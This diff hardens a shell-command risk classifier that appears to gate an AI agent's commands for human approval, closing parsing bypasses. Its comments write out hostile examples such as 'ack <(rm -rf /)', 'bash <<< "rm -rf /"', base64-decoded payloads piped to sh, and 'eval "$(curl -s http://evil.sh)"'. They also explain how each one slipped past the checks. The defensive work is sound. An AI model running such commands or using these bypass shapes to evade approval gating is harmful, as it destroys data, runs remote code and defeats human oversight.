@@ -106,7 +106,18 @@ DEFAULT_REQUIRE_APPROVAL: list[str] = [
 _SHELL_EXECS = {"bash", "sh", "zsh", "dash", "ksh", "ash", "fish", "su"}
 
 # Execs whose arguments are executable text (a remote command, a script).
-_EVAL_EXECS = {"eval", "exec", "ssh", "sshpass", "xargs"}
+_EVAL_EXECS = {
+    # `trap 'cmd' EXIT` registers a command string that runs when the shell
+    # LEAVES. The payload is an ordinary quoted operand, so without this it is
+    # redacted as prose exactly as `echo "..."` correctly is. The deferral
+    # changes the deny message and the audit trail, not the decision. (rf-zvll A2)
+    "trap",
+    "eval",
+    "exec",
+    "ssh",
+    "sshpass",
+    "xargs",
+}
 
 # Flags carrying an executable string (`bash -c`, `python -c`, `mysql -e`, `find -exec`).
 _EVAL_FLAGS = {"-c", "-e", "--command", "--execute", "--eval", "-exec", "--exec"}
@@ -132,6 +143,13 @@ _CHAIN_OPS = {";", "&&", "||", "|", "&"}
 
 
 # Operators whose following token is a redirect target (a path — never data).
+# `<<<` is deliberately ABSENT: it is a here-STRING, and its operand is stdin
+# CONTENT, not a path. Treating it as a redirect target left the text untouched,
+# which over-blocked a data owner (`cat <<< "…rm -rf /…" > notes.md` classified
+# critical -- #230's shape, one operator over) and under-blocked a shell one
+# (`bash <<< "rm -rf /"` classified high, though the shell runs it). Falling
+# through to the ordinary operand path asks the question the heredoc work
+# already answers: does this command execute what it reads? (sable-4nt2)
 _REDIRECT_OPS = {">", ">>", "<", "<<"}
 
 # Bound on recursion through nested shell wrappers / substitutions.
@@ -236,6 +254,23 @@ def _tokenize(s: str) -> tuple[list[_Piece], bool]:
             i += 1
             continue
 
+        # `<(cmd)` / `>(cmd)` -- PROCESS SUBSTITUTION. The content is a command
+        # that RUNS, exactly as `$(cmd)` does, so it goes in substs and the
+        # existing recursive scan handles it with no new rule.
+        #
+        # Without this the tokenizer never forms the construct: it emits op `<`,
+        # which is in _REDIRECT_OPS, so `(cmd` becomes a redirect TARGET and is
+        # left untouched, while the remaining words are redacted as the host's
+        # data operands. TWO independent wrong decisions that conspire --
+        # `ack <(rm -rf /)` sanitized to `ack <(rm    `, the harmless-looking
+        # head preserved and the dangerous tail deleted. Fixing either alone
+        # leaves the bypass, which is worth knowing when reviewing this. (rf-zvll)
+        if c in ("<", ">") and i + 1 < n and s[i + 1] == "(":
+            start = i
+            inner, i = _read_subst(s, i)
+            pieces.append(_Piece(start, i, None, "", False, [inner]))
+            continue
+
         if _is_op_char(c):
             start = i
             if c in ("\n", "\r"):
@@ -244,7 +279,17 @@ def _tokenize(s: str) -> tuple[list[_Piece], bool]:
                 pieces.append(_Piece(start, i, ";", ";", False, []))
                 continue
             two = s[i:i + 2]
-            op = two if two in ("&&", "||", ">>", "<<") else c
+            # `<<<` before `<<`, or it tokenizes as `<<` + `<` and the
+            # here-string operand becomes a redirect target -- left untouched,
+            # which is how it ended up both over- and under-blocked
+            # (sable-4nt2).
+            three = s[i:i + 3]
+            if three == "<<<":
+                op = three
+            elif two in ("&&", "||", ">>", "<<"):
+                op = two
+            else:
+                op = c
             i += len(op)
             pieces.append(_Piece(start, i, op, op, False, []))
             continue
@@ -885,6 +930,87 @@ def modifies_rafter_security_config(command: str) -> bool:
     return sanitized != command and _disarms_rafter(sanitized)
 
 
+def shell_program_from_stream(command: str) -> bool:
+    """True if a SHELL receives its program through a channel rather than as a path.
+
+    rf-zvll mechanism B. Three shapes, all measured executing by the sandboxed
+    oracle while classifying `low`:
+
+        cat payload.txt | sh        the payload is in a file
+        echo <b64> | base64 -d | sh the payload is encoded
+        bash < payload.txt          no pipe at all, just a redirect
+
+    The classifier cannot read any of them, so no amount of better parsing
+    recovers the payload -- this is a POSTURE decision, not an analysis one. A
+    shell fed from a channel requires approval regardless of whether we can see
+    what it is being fed.
+
+    DELIBERATELY EXCLUDES a plain file ARGUMENT (`bash deploy.sh`). We cannot
+    read that either, so the distinction is not one of RISK -- it is one of
+    FREQUENCY, and saying so plainly matters more than dressing it up. Measured
+    over 13,613 intercepted commands: the stream forms are 0.022% of traffic in
+    2 of 665 repos, while `curl|wget` into a shell -- already approval-gated --
+    is 100 events. The form that already prompts is 33x more common than
+    everything this newly gates, so the added prompt volume is ~3% of what
+    curl|bash already generates. That sample is ONE machine; the limit and what
+    would overturn it are recorded on rf-zvll.
+    """
+    pieces, _ = _tokenize(command)
+    segments: list[list[_Piece]] = []
+    enders: list[str | None] = []
+    cur: list[_Piece] = []
+    for piece in pieces:
+        if piece.op is not None and piece.op in _CHAIN_OPS:
+            segments.append(cur); enders.append(piece.op); cur = []
+            continue
+        cur.append(piece)
+    segments.append(cur); enders.append(None)
+
+    def _resolve(seg: list[_Piece]) -> str:
+        """Exec of a segment, skipping wrappers, their flags and env assignments.
+
+        Iterative, not one step: `env FOO=1 bash` needs two skips, and a single
+        lookahead silently resolved to `FOO=1` -- caught by its own test row.
+        """
+        words = [w for w in seg if w.op is None]
+        k = 0
+        while k < len(words):
+            t = words[k].text
+            if _ENV_ASSIGNMENT.match(t) or t.startswith("-"):
+                k += 1
+                continue
+            if _exec_name(t) in _TAIL_WRAPPERS:
+                k += 1
+                continue
+            return _exec_name(t)
+        return ""
+
+    for idx, seg in enumerate(segments):
+        exec_ = _resolve(seg)
+        # `eval "$(cat f)"` / `eval "$(curl -s http://x)"` -- a program-executing
+        # consumer fed from a substitution whose OUTPUT we cannot read. Same
+        # semantic test as the pipe case; pipe-vs-substitution is syntax.
+        #
+        # Deliberately covers ANY substitution rather than only data-readers.
+        # A reader-only rule looked tempting and misses
+        # `eval "$(curl -s http://evil.sh)"` -- remote code, the worst shape in
+        # the set -- so the narrow version was rejected on that, not on taste.
+        # Measured cost of the broad rule: ZERO occurrences in 13,647 commands
+        # across 671 repos, so it gates nothing anyone actually runs here.
+        if exec_ in _EVAL_EXECS and any(w.op is None and w.substs for w in seg):
+            return True
+        if exec_ in _SHELL_EXECS:
+            # `bash < file` / `bash <<< str` -- the program arrives on stdin.
+            for w in seg:
+                if w.op in ("<", "<<<"):
+                    return True
+        # `… | bash` -- this segment's OUTPUT is the next one's program.
+        if enders[idx] == "|" and idx + 1 < len(segments):
+            if _resolve(segments[idx + 1]) in _SHELL_EXECS:
+                return True
+    return False
+
+
 def assess_command_risk(command: str) -> str:
     """Assess risk level of a command string."""
     # rf-vnxs: checked before the pattern loops. The disarm is an ordinary
@@ -897,6 +1023,12 @@ def assess_command_risk(command: str) -> str:
     for p in CRITICAL_PATTERNS:
         if re.search(p, cmd, re.IGNORECASE):
             return "critical"
+    # rf-zvll B2: a shell fed its program from a channel we cannot read requires
+    # approval. Checked AFTER critical so `echo 'rm -rf /' | sh` -- where the
+    # payload IS readable and matches -- keeps its hard block rather than being
+    # softened to approval.
+    if shell_program_from_stream(command):
+        return "high"
     for p in HIGH_PATTERNS:
         if re.search(p, cmd, re.IGNORECASE):
             return "high"
